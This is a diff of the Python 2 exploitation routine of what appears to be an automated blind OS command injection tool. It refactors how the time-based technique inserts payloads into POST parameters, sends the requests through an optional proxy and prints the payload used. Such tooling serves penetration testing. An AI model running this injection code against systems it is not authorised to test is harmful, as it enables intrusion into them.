@@ -33,7 +33,7 @@ from src.core.requests import parameters
  The "time-based" injection technique on Blind OS Command Injection.
 """
 
-def exploitation(url,delay,filename):
+def exploitation(url,delay,filename,http_request_method):
   
   counter = 0
   vp_flag = True
@@ -48,12 +48,6 @@ def exploitation(url,delay,filename):
   output_file.write("\n(+) Type : " + injection_type)
   output_file.write("\n(+) Technique : " + technique.title())
   output_file.close()
-  
-  # Check if HTTP Method is POST.
-  if not menu.options.data:
-    http_request_method = "GET"
-  else:
-    http_request_method = "POST"
     
   # Check if defined "--maxlen" option.
   if menu.options.maxlen:
@@ -197,53 +191,48 @@ def exploitation(url,delay,filename):
 		  
 	      # Check if defined method is POST.
 	      else:
-		# Check if defined the testable parameters.
-		if not menu.options.data:
-		  print colors.RED + "(x) Error: You must specify the testable parameter.\n" + colors.RESET
-		  break
+
+		parameter = menu.options.data
+		parameter = urllib2.unquote(parameter)
+		
+		# Check if its not specified the 'INJECT_HERE' tag
+		parameter = parameters.do_POST_check(parameter)
+		
+		data = re.sub(settings.INJECT_TAG, payload, parameter)
+
+		# Define the vulnerable parameter
+		if re.findall(r"&(.*)="+settings.INJECT_TAG+"", url):
+		  vuln_parameter = re.findall(r"&(.*)="+settings.INJECT_TAG+"", url)
+		  vuln_parameter = ''.join(vuln_parameter)
+		  
+		elif re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url):
+		  vuln_parameter = re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url)
+		  vuln_parameter = ''.join(vuln_parameter)
 		  
 		else:
-		  parameter = menu.options.data
-		  parameter = urllib2.unquote(parameter)
+		  vuln_parameter = parameter
 		  
-		  # Check if its not specified the 'INJECT_HERE' tag
-		  parameter = parameters.do_POST_check(parameter)
-		  
-		  data = re.sub(settings.INJECT_TAG, payload, parameter)
-
-		  # Define the vulnerable parameter
-		  if re.findall(r"&(.*)="+settings.INJECT_TAG+"", url):
-		    vuln_parameter = re.findall(r"&(.*)="+settings.INJECT_TAG+"", url)
-		    vuln_parameter = ''.join(vuln_parameter)
-		    
-		  elif re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url):
-		    vuln_parameter = re.findall(r"\?(.*)="+settings.INJECT_TAG+"", url)
-		    vuln_parameter = ''.join(vuln_parameter)
-		    
-		  else:
-		    vuln_parameter = parameter
-		    
-		  request = urllib2.Request(url, data)
-		  
-		  # Check if defined extra headers.
-		  headers.do_check(request)
-		  
-		  # Check if defined any HTTP Proxy.
-		  if menu.options.proxy:
-		    try:
-		      proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		      opener = urllib2.build_opener(proxy)
-		      urllib2.install_opener(opener)
-		      response = urllib2.urlopen(request)
-		      response.read()
-		      
-		    except urllib2.HTTPError, err:
-		      print "\n(x) Error : " + str(err)
-		      sys.exit(1) 
-	      
-		  else:
+		request = urllib2.Request(url, data)
+		
+		# Check if defined extra headers.
+		headers.do_check(request)
+		
+		# Check if defined any HTTP Proxy.
+		if menu.options.proxy:
+		  try:
+		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+		    opener = urllib2.build_opener(proxy)
+		    urllib2.install_opener(opener)
 		    response = urllib2.urlopen(request)
 		    response.read()
+		    
+		  except urllib2.HTTPError, err:
+		    print "\n(x) Error : " + str(err)
+		    sys.exit(1) 
+	    
+		else:
+		  response = urllib2.urlopen(request)
+		  response.read()
 		      
 	      end  = time.time()
 	      how_long = int(end - start)
@@ -275,7 +264,7 @@ def exploitation(url,delay,filename):
 	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
 	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
 	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
-	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
+	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", urllib.unquote_plus(payload)) + colors.RESET + "\n"
 		
 	    else :
 	      
